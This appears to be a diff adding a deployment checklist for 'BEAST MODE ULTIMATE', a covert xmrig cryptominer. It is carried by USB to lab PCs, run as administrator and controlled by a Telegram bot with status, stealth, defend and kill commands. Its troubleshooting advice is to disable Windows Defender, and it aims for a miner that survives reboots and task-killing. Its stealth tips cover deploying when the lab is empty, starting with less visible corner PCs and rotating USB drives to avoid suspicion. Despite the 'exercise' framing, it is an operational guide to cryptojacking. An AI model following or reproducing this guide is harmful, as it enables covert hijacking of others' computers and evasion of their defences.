@@ -1,0 +1,65 @@
+🔥 BEAST MODE ULTIMATE - Quick Deployment Checklist
+
+================================ BEFORE DEPLOYMENT ================================
+□ Test Telegram bot: powershell -ExecutionPolicy Bypass -File "TEST_TELEGRAM.ps1"
+□ Verify you get test message in Telegram
+□ Check miner_src folder has: xmrig.exe, config.json, WinRing0x64.sys
+□ Copy entire xmrig-6.22.2 folder to USB drive
+
+================================ ON TARGET PC ================================
+□ Insert USB drive
+□ Copy xmrig-6.22.2 folder to target PC (Desktop is fine)
+□ Right-click BEAST_MODE_ULTIMATE.bat → "Run as administrator"
+□ Wait 2-3 minutes for complete deployment
+□ Remove USB drive (system continues running)
+
+================================ VERIFY SUCCESS ================================
+□ Check Telegram for: "🚀 BEAST MODE DEPLOYMENT" message
+□ Wait for status report (arrives within 7 minutes)  
+□ Test command: Send "/status beast2025" to your Telegram bot
+□ Expected response: Fleet status with hashrate info
+
+================================ REMOTE COMMANDS ================================
+/status beast2025    - Get current status
+/restart beast2025   - Restart miner
+/boost beast2025     - Performance boost
+/stealth beast2025   - Maximum invisibility
+/defend beast2025    - Defense mode
+/health beast2025    - System health
+
+================================ CLEANUP (AFTER EXERCISE) ================================
+□ Run REMOVE_ALL_V6.bat on each PC as administrator
+□ Verify complete removal
+□ Or send emergency command: "/kill beast2025"
+
+================================ TROUBLESHOOTING ================================
+Problem: No Telegram messages
+□ Check internet connection on target PC
+□ Verify Telegram bot token/chat ID are correct
+
+Problem: Miner not starting  
+□ Check if antivirus blocked deployment
+□ Try disabling Windows Defender temporarily
+□ Verify admin privileges were granted
+
+Problem: Low hashrate
+□ Send "/boost beast2025" command
+□ Check CPU isn't thermal throttling
+□ Verify huge pages are enabled
+
+================================ SUCCESS INDICATORS ================================
+✅ Telegram deployment notification received
+✅ Status reports arrive every 7 minutes
+✅ Hashrate: 2800-3200 H/s per PC (i5 2.5GHz)  
+✅ Remote commands work via Telegram
+✅ Miner survives reboot/task killing attempts
+
+================================ STEALTH TIPS ================================
+• Deploy during breaks when lab is empty
+• Start with corner PCs (less visible)
+• Use multiple USB drives to avoid suspicion  
+• Monitor Telegram constantly during exercise
+• Have backup deployment ready
+
+🎯 Target: 10+ PCs for epic project success!
+💪 Good luck dominating that cybersecurity exercise!
